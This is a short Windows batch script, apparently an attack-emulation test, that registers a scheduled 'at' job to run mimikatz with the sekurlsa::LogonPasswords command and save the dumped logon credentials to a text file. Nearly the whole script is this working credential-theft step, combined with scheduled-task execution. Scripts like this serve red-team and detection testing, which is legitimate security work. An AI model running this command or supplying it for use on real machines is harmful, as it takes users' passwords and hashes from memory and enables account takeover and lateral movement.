@ECHO OFF

ECHO ===========================================================================
ECHO At Job Creation
ECHO.
ECHO Registering mimikatz in At job
ping -n 5 127.0.0.1 > NUL

at 13:00 "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
